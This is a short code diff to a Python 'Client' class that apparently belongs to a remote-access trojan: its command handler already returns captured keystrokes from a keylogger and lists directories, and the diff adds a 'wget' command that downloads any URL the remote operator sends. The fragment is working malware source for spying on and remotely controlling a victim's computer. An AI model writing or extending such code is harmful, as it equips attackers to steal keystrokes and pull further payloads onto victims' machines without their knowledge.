@@ -188,6 +188,8 @@ class Client:
                             exit()
                         case "keylogger":
                             command_response = self.keylogger.get_keylogs()
+                        case "wget":
+                            command_response = commands.wget_url(command[1])
                         case "dir":
                             command_response = os.listdir()
                         case _:
